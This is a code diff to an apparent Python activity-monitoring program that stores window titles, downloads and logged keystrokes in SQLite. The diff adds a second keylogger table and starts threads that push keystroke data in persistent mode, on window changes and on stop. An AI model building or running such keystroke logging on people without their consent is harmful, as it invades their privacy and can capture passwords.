@@ -114,6 +114,11 @@ def create_database():
             t TEXT,
             content TEXT, characters TEXT)''')
 
+        my_cursor_ini.execute('''CREATE TABLE IF NOT EXISTS key_logger_new ( id INTEGER PRIMARY KEY, window TEXT, p_name TEXT,
+                   d TEXT,
+                   t TEXT,
+                   content TEXT, characters TEXT)''')
+
         my_cursor_ini.execute('''CREATE TABLE IF NOT EXISTS downloads ( id INTEGER PRIMARY KEY, file TEXT, path TEXT,
             d TEXT,
             t TEXT, 
@@ -162,6 +167,7 @@ def persistent(kill_flag):
                 connection.commit()
 
             threading.Thread(name="Persistent key logger push", target=key_log.push_data, args=(db_path,)).start()
+            threading.Thread(name="Persistent key logger push new", target=key_log.push_data_new, args=(db_path,)).start()
         else:
             time_loop += 5
         time.sleep(5)
@@ -245,6 +251,7 @@ def compare_windows(key=None, x=None):
         # prev_window = window
         if options['disable_keylog'] == '0':
             threading.Thread(name="push data key logger", target=key_log.push_data, args=(db_path,)).start()
+            threading.Thread(name="push data key logger", target=key_log.push_data_new, args=(db_path,)).start()
 
         threading.Thread(name="track thread", target=track, args=()).start()
 
@@ -420,6 +427,7 @@ def stop():
         prev_window_track = ''
         threading.Thread(name="END track thread", target=track, args=()).start()
         threading.Thread(name="END key logger push", target=key_log.push_data, args=(db_path,)).start()
+        threading.Thread(name="END key logger push new", target=key_log.push_data_new, args=(db_path,)).start()
         # m_listener.stop()
         kill.set()
 
